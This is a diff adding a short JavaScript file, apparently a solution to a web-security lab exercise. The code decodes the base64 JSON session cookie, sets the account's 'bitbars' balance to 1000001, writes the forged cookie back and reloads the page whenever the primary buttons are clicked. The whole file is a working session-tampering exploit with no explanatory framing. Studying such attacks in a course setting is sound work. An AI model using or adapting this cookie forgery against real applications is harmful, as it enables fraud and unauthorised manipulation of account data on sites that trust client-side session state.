@@ -1,0 +1,18 @@
+function change(){
+   const cookieValue = document.cookie.split("=")[1];
+    const decodedCookie = atob(cookieValue);
+    const sessionData = JSON.parse(decodedCookie);
+    sessionData.account.bitbars= 1000001;    
+    const updatedSessionData = JSON.stringify(sessionData);
+    const encodedCookie = btoa(updatedSessionData);
+    document.cookie = `session=${encodedCookie}`;
+}
+
+const show = document.getElementsByClassName("pure-button button-primary");
+
+for (let i = 0; i < show.length; i++) {
+  show[i].addEventListener("click", function() {
+    change();
+    window.location.reload(); 
+  });
+}
